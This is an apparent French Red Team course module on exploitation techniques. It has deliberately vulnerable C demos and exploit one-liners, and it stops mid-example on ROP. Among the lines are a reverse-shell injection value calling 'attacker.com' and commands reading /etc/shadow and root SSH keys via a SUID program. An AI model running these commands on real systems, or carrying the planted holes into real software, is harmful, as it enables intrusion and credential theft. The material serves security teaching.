# Module 53 : Exploitation de VulnÃ©rabilitÃ©s

## ğŸ¯ Ce que tu vas apprendre

Dans ce module, tu vas maÃ®triser :
- Identifier les vulnÃ©rabilitÃ©s classiques (buffer overflow, format string, etc.)
- Exploiter les failles mÃ©moire
- Techniques de privilege escalation
- DÃ©velopper des exploits fonctionnels
- Contourner les protections modernes (NX, ASLR, Stack Canaries)
- MÃ©thodologie de dÃ©veloppement d'exploits

## ğŸ“š ThÃ©orie

### C'est quoi une vulnÃ©rabilitÃ© ?

Une **vulnÃ©rabilitÃ©** est une faiblesse dans un systÃ¨me qui peut Ãªtre exploitÃ©e pour compromettre la sÃ©curitÃ©. En Red Team, on cherche et exploite ces failles pour prendre le contrÃ´le de systÃ¨mes cibles.

### Types de vulnÃ©rabilitÃ©s

1. **Buffer Overflow** : Ã‰criture au-delÃ  des limites d'un buffer
2. **Format String** : Utilisation incorrecte de printf/scanf
3. **Use-After-Free** : Utilisation de mÃ©moire libÃ©rÃ©e
4. **Integer Overflow** : DÃ©passement de capacitÃ© d'entiers
5. **Race Condition** : ProblÃ¨mes de synchronisation
6. **Command Injection** : Injection de commandes systÃ¨me

### Protections modernes

1. **Stack Canaries** : Valeur alÃ©atoire pour dÃ©tecter les overflows
2. **NX (No-Execute)** : EmpÃªche l'exÃ©cution de code sur la pile
3. **ASLR** : Randomisation des adresses mÃ©moire
4. **PIE** : Position Independent Executable
5. **RELRO** : Read-Only GOT/PLT

## ğŸ” Visualisation

### Buffer Overflow classique

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          BUFFER OVERFLOW EXPLOITATION               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  Ã‰tat normal de la pile:                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ Return Address (0x7fffffffe100)    â”‚ â† Cible    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ Saved EBP                          â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ Buffer[64]                         â”‚            â”‚
â”‚  â”‚ (vide)                             â”‚            â”‚
â”‚  â”‚ ...                                â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  AprÃ¨s strcpy(buffer, "A" * 80):                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ Return Address Ã‰CRASÃ‰E             â”‚            â”‚
â”‚  â”‚ â†’ 0x4141414141414141 (AAAAAAAA)    â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ Saved EBP Ã©crasÃ©                   â”‚            â”‚
â”‚  â”‚ â†’ 0x4141414141414141               â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ Buffer[64] rempli                  â”‚            â”‚
â”‚  â”‚ AAAAAAAAAAAAAAAAAAAAAAAAAAAA...    â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  Exploitation:                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ Return Address                     â”‚            â”‚
â”‚  â”‚ â†’ 0x7fffffffe200 (adresse shellcode)            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ Saved EBP (junk)                   â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ NOP Sled (\x90 * 20)               â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ Shellcode                          â”‚            â”‚
â”‚  â”‚ \x48\x31\xc0\xb0\x3b...            â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  Quand la fonction retourne:                        â”‚
â”‚  â†’ EIP = shellcode address                          â”‚
â”‚  â†’ Shellcode exÃ©cutÃ©                                â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Format String Vulnerability

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       FORMAT STRING VULNERABILITY                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  Code vulnÃ©rable:                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ char user_input[100];              â”‚            â”‚
â”‚  â”‚ gets(user_input);                  â”‚            â”‚
â”‚  â”‚ printf(user_input); // VULNÃ‰RABLE  â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  Correct:                                           â”‚
â”‚  printf("%s", user_input);                          â”‚
â”‚                                                     â”‚
â”‚  Exploitation:                                      â”‚
â”‚                                                     â”‚
â”‚  1. Leak d'informations                             â”‚
â”‚  Input: "%x %x %x %x"                               â”‚
â”‚  Output: "deadbeef 7fffffffe100 80484000 0"        â”‚
â”‚  â†’ RÃ©vÃ¨le le contenu de la pile                    â”‚
â”‚                                                     â”‚
â”‚  2. Ã‰criture en mÃ©moire (%n)                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ printf("%08x.%08x.%n");            â”‚            â”‚
â”‚  â”‚         â†‘         â†‘   â†‘            â”‚            â”‚
â”‚  â”‚         â”‚         â”‚   â””â”€ Ã‰crit 16  â”‚            â”‚
â”‚  â”‚         â”‚         â”‚      Ã  l'adresseâ”‚            â”‚
â”‚  â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€ Padding       â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  3. Exploitation complÃ¨te                           â”‚
â”‚  Input: "\x10\x96\x04\x08%08x%08x%n"               â”‚
â”‚          â””â”€â”€â”¬â”€â”€â”˜                                    â”‚
â”‚             â””â”€ Adresse cible (GOT entry)           â”‚
â”‚                                                     â”‚
â”‚  RÃ©sultat: Ã‰crit une valeur Ã  0x08049610           â”‚
â”‚  â†’ Peut modifier GOT pour rediriger vers shellcode â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Use-After-Free

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          USE-AFTER-FREE VULNERABILITY               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  1. Allocation                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ char *ptr = malloc(64);            â”‚            â”‚
â”‚  â”‚ strcpy(ptr, "Data");               â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  Heap:                                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ 0x12340000: "Data"                 â”‚ â† ptr      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  2. LibÃ©ration                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ free(ptr);                         â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  Heap:                                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ 0x12340000: [FREED]                â”‚ â† ptr (dangling)
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  3. Utilisation aprÃ¨s free (BUG)                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ printf("%s", ptr); // UAF          â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  4. Exploitation                                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ // RÃ©allouer la zone avec donnÃ©es  â”‚            â”‚
â”‚  â”‚ // malveillantes                   â”‚            â”‚
â”‚  â”‚ char *evil = malloc(64);           â”‚            â”‚
â”‚  â”‚ strcpy(evil, shellcode);           â”‚            â”‚
â”‚  â”‚                                    â”‚            â”‚
â”‚  â”‚ // ptr pointe maintenant sur evil  â”‚            â”‚
â”‚  â”‚ void (*func)() = (void(*)())ptr;   â”‚            â”‚
â”‚  â”‚ func(); // ExÃ©cute shellcode       â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### ROP (Return-Oriented Programming)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      ROP - Bypass NX/DEP                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  ProblÃ¨me: NX empÃªche l'exÃ©cution sur la pile      â”‚
â”‚  Solution: RÃ©utiliser du code existant (gadgets)   â”‚
â”‚                                                     â”‚
â”‚  Gadgets (sÃ©quences d'instructions + ret):          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ 0x08048100: pop rdi; ret           â”‚ Gadget 1   â”‚
â”‚  â”‚ 0x08048200: pop rsi; ret           â”‚ Gadget 2   â”‚
â”‚  â”‚ 0x08048300: pop rdx; ret           â”‚ Gadget 3   â”‚
â”‚  â”‚ 0x08048400: syscall; ret           â”‚ Gadget 4   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  Pile malveillante (ROP chain):                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ 0x08048100 (pop rdi; ret)          â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ 0x00000000 (argument pour RDI)     â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ 0x08048200 (pop rsi; ret)          â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ 0x00000000 (argument pour RSI)     â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ 0x08048300 (pop rdx; ret)          â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ 0x00000000 (argument pour RDX)     â”‚            â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤            â”‚
â”‚  â”‚ 0x08048400 (syscall)               â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  ExÃ©cution:                                         â”‚
â”‚  ret â†’ pop rdi; ret â†’ ret â†’ pop rsi; ret â†’ ...     â”‚
â”‚                                                     â”‚
â”‚  RÃ©sultat: Appel systÃ¨me avec contrÃ´le complet     â”‚
â”‚           des registres sans code sur la pile      â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## ğŸ’» Exemple pratique

### Exemple 1 : Buffer Overflow simple

```c
#include <stdio.h>
#include <string.h>

// Fonction vulnÃ©rable
void vulnerable_function(char *input) {
    char buffer[64];

    // VULNÃ‰RABILITÃ‰: pas de vÃ©rification de taille
    strcpy(buffer, input);

    printf("Buffer: %s\n", buffer);
}

void secret_function() {
    printf("\n[!] SECRET FUNCTION CALLED!\n");
    printf("[+] You successfully exploited the buffer overflow!\n");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    printf("=== Buffer Overflow Demo ===\n\n");
    printf("Secret function address: %p\n", secret_function);
    printf("Buffer address: %p\n\n", &argv[1]);

    vulnerable_function(argv[1]);

    printf("\nProgram completed normally\n");

    return 0;
}

/*
Exploitation:

1. Compiler sans protections:
   gcc -fno-stack-protector -z execstack -no-pie overflow.c -o overflow

2. Trouver l'offset:
   python3 -c 'print("A"*72 + "BBBBBBBB")' | ./overflow

3. Calculer l'adresse de secret_function

4. Exploiter:
   python3 -c 'import struct; print("A"*72 + struct.pack("<Q", 0x000055555555XXXX))' | ./overflow
*/
```

### Exemple 2 : Format String Vulnerability

```c
#include <stdio.h>
#include <stdlib.h>

int secret_value = 0;

void vulnerable_printf(char *user_input) {
    printf("=== Format String Demo ===\n\n");

    printf("Secret value: %d\n", secret_value);
    printf("Secret address: %p\n\n", &secret_value);

    // VULNÃ‰RABILITÃ‰: utilisation directe de l'input
    printf(user_input);
    printf("\n");

    printf("\nSecret value after: %d\n", secret_value);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <format_string>\n", argv[0]);
        printf("\nExamples:\n");
        printf("  Leak stack: %%x.%%x.%%x.%%x\n");
        printf("  Read memory: %%s\n");
        printf("  Write memory: %%n\n");
        return 1;
    }

    vulnerable_printf(argv[1]);

    return 0;
}

/*
Exploitation examples:

1. Leak de la pile:
   ./format_string "%x.%x.%x.%x.%x"

2. Lire Ã  une adresse:
   ./format_string "$(python3 -c 'import struct; print(struct.pack("<Q", 0x7fffffffXXXX) + "%s")')"

3. Ã‰crire (modifier secret_value):
   ./format_string "$(python3 -c 'import struct; print(struct.pack("<Q", 0x7fffffffXXXX) + "%100d%n")')"
*/
```

### Exemple 3 : Integer Overflow

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable_allocation(unsigned int size) {
    printf("=== Integer Overflow Demo ===\n\n");

    // VULNÃ‰RABILITÃ‰: size + 1 peut overflow
    unsigned int alloc_size = size + 1;

    printf("Requested size: %u\n", size);
    printf("Allocation size: %u\n", alloc_size);

    if (alloc_size == 0) {
        printf("\n[!] Integer overflow detected!\n");
        printf("[*] alloc_size wrapped to 0\n");
        return;
    }

    char *buffer = malloc(alloc_size);

    if (!buffer) {
        printf("[-] Allocation failed\n");
        return;
    }

    printf("[+] Buffer allocated at: %p\n", buffer);

    // Ã‰criture dangereuse
    memset(buffer, 'A', size);
    buffer[size] = '\0';

    printf("[+] Buffer filled\n");

    free(buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <size>\n", argv[0]);
        return 1;
    }

    unsigned int size = atoi(argv[1]);
    vulnerable_allocation(size);

    return 0;
}

/*
Exploitation:

1. Overflow normal:
   ./int_overflow 100

2. Integer overflow:
   ./int_overflow 4294967295  # UINT_MAX
   # size + 1 = 0 (wraparound)
*/
```

### Exemple 4 : Use-After-Free

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*callback)();
    char data[64];
} Object;

void normal_callback() {
    printf("[Normal] Callback executed\n");
}

void malicious_callback() {
    printf("\n[!!!] MALICIOUS CALLBACK EXECUTED!\n");
    printf("[+] Use-After-Free exploitation successful!\n");
}

int main() {
    printf("=== Use-After-Free Demo ===\n\n");

    // 1. CrÃ©er un objet
    Object *obj = malloc(sizeof(Object));
    obj->callback = normal_callback;
    strcpy(obj->data, "Original data");

    printf("[+] Object allocated at: %p\n", obj);
    printf("[+] Callback address: %p\n", obj->callback);

    // 2. Utilisation normale
    printf("\n[*] Normal usage:\n");
    obj->callback();

    // 3. LibÃ©ration
    printf("\n[*] Freeing object...\n");
    free(obj);

    // 4. Use-After-Free (BUG)
    printf("\n[!] Using freed object...\n");

    // 5. Exploitation: rÃ©allocation avec donnÃ©es malveillantes
    Object *malicious = malloc(sizeof(Object));
    malicious->callback = malicious_callback;
    strcpy(malicious->data, "Malicious data");

    printf("[+] New allocation at: %p\n", malicious);

    // Si la nouvelle allocation rÃ©utilise la mÃªme adresse
    if ((void*)malicious == (void*)obj) {
        printf("[+] Same address! UAF exploitable\n");
    }

    // 6. Appel via l'ancien pointeur (UAF)
    obj->callback(); // Appelle malicious_callback!

    free(malicious);

    return 0;
}
```

### Exemple 5 : Command Injection

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable_system_call(char *filename) {
    char command[256];

    printf("=== Command Injection Demo ===\n\n");

    // VULNÃ‰RABILITÃ‰: concatÃ©nation directe sans validation
    snprintf(command, sizeof(command), "cat %s", filename);

    printf("Executing: %s\n\n", command);

    system(command);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        printf("\nLegitimate: ./cmd_inject test.txt\n");
        printf("Malicious:  ./cmd_inject 'test.txt; id'\n");
        return 1;
    }

    vulnerable_system_call(argv[1]);

    return 0;
}

/*
Exploitation:

1. Usage normal:
   ./cmd_inject test.txt

2. Command injection:
   ./cmd_inject 'test.txt; whoami'
   ./cmd_inject 'test.txt; cat /etc/passwd'
   ./cmd_inject '$(nc attacker.com 4444 -e /bin/sh)'

Protection:
   - Ne jamais concatÃ©ner l'input utilisateur dans system()
   - Utiliser execve() avec arguments sÃ©parÃ©s
   - Valider/sanitizer l'input
*/
```

## ğŸ¯ Application Red Team

### 1. Exploit de privilege escalation (SUID)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/*
Programme SUID vulnÃ©rable (compilÃ© avec bit SUID root)
gcc -o suid_vuln suid_vuln.c
sudo chown root:root suid_vuln
sudo chmod 4755 suid_vuln
*/

void read_file(char *filename) {
    FILE *fp = fopen(filename, "r");
    char buffer[256];

    if (!fp) {
        perror("Error opening file");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("%s", buffer);
    }

    fclose(fp);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }

    printf("Running as UID: %d\n", getuid());
    printf("Effective UID: %d\n\n", geteuid());

    // VULNÃ‰RABILITÃ‰: pas de vÃ©rification de chemin
    // Permet de lire n'importe quel fichier avec les droits root

    read_file(argv[1]);

    return 0;
}

/*
Exploitation:

1. Lire /etc/shadow (normalement interdit):
   ./suid_vuln /etc/shadow

2. Lire /root/.ssh/id_rsa:
   ./suid_vuln /root/.ssh/id_rsa

Protection:
   - Valider le chemin
   - Utiliser setuid() pour baisser les privilÃ¨ges
   - Liste blanche de fichiers autorisÃ©s
*/
```

### 2. Exploit complet avec ROP (bypass NX)

```c
#include <stdio.h>
#include <string.h>

// Fonctions "gadgets" pour ROP
void gadget1() {
    asm("pop %rdi; ret");
}

void gadget2() {
    asm("pop %rsi; ret");
}

void gadget3() {
    asm("pop %rdx; ret");
}

void win_function() {
    printf("\n[!!!] WIN FUNCTION CALLED!\n");
    printf("[+] ROP chain executed successfully!\n");
    printf("[+] You bypassed NX protection!\n");
}

void vulnerable(char *input) {
    char buffer[64];

    printf("=== ROP Exploitation Demo ===\n\n");

    printf("Gadget addresses:\n");
    printf("  gadget1 (pop rdi): %p\n", gadget1);
    printf("  gadget2 (pop rsi): %p\n", gadget2);
    printf("  gadget3 (pop rdx): %p\n", gadget3);
    printf("  win_function: %p\n\n", win_function);

    // VULNÃ‰RABILITÃ‰
    strcpy(buffer, input);
}

